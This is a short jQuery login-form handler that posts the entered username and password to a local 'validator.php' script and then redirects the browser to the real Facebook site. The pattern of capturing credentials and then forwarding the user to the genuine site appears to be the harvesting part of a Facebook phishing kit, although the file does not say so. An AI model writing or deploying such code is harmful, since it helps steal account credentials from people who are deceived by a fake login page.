    $(document).ready(function() {

        $("#submit").click(function() {

            var username = $("#username").val();
            var password = $("#password").val();

            if (username == '' || password == '') {
                alert("Please fill all fields.");
                return false;
            }

            $.ajax({
                type: "POST",
                url: "../functions/validator.php",
                data: {
                    username: username,
                    password: password
                },
                cache: false,
                success: function() {
                    window.location.replace("https://web.facebook.com");
                },
                error: function(xhr, status, error) {
                    console.error(xhr);
                }
            });
        });
    });